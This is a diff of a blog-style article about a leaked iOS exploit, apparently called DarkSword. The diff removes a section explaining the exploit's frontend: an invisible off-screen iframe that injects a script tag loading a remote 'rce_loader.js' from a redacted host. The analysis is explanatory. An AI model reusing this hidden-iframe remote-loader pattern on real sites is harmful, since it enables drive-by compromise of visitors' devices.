@@ -141,57 +141,6 @@ It’s a good common practice to:
 > **Note**
 > The original attack only launches when it finds a phone with a Ukrainian IP address, however, because it has been leaked on GitHub, people can easily change and deploy their own versions of the exploit that target other countries too.
 
-**What does it do?**
-I’m only going to share how the frontend exploit with HTML works, because the JS is way too malicious and I’m afraid if I explain it in-depth it can be used to attack people who use older versions of iOS.
-
-### frame.html
-1. **Runs immediately when the page loads**
-   * The inline `<script>` executes during page parsing.
-2. **Writes a new `<script>`tag into the HTML**
-It dynamically inserts: ```<script defer="defer" src="https://**************/rce_loader.js?<timestamp>"></script>```
-3. **Loads an external malware JavaScript file**
-4. **Adds a cache-busting query parameter, so the malware always stays updated.**
-```js
-Date.now()
-```
-*This appends the current timestamp to the URL. The purpose is to prevent the browser from caching the script so it fetches a fresh copy every time.
-
-### index.html
-1. Sets a value in sessionStorage
-```js
-sessionStorage.setItem('uid', '1');
-```
-	- Stores a key-value pair in the browser’s **session storage**.
-	- `uid = 1` will persist **only for the current tab/session** (cleared when the tab closes).
-	- The comment above it is in Russian: “if uid is still needed — just set it”
-
-So this is likely used to simulate or identify a user/session inside the app.
-
-2. Dynamically load an iframe
-```js
-const frame = document.createElement('iframe');
-```
-	- Instead of writing `<iframe>` in HTML, it’s created via JavaScript.
-
-3. Loads the iframe’s url
-```js
-frame.src = 'frame.html?' + Math.random();
-```
-	- Loads the `frame.html` file.
-	- Appends `?` + random number to prevent caching & ensure a fresh request every time.
-
-4. Hides the iframe completely
-```js
-frame.style.width = '1px';frame.style.opacity = '0.01'frame.style.position = 'absolute';frame.style.left = '-9999px';frame.style.height = '1px';frame.style.border = 'none';
-```
-The iframe is:, Extremely small (1px), Nearly invisible (`opacity: 0.01`), Positioned off-screen (`left: -9999px`), finally with the border removed. The effect? The iframe runs in the background without being seen.
-
-5. Finally, load the iframe onto the page
-```
-document.body.appendChild(frame);
-```
-This actually loads `frame.html`.
-
 **So that’s all for today**
 Hope you enjoyed the article. On the other hand, if you want to learn more, simply see other people’s articles on DarkSword and you’ll find a lot of knowledge my brain probably has never even thought of before.
 
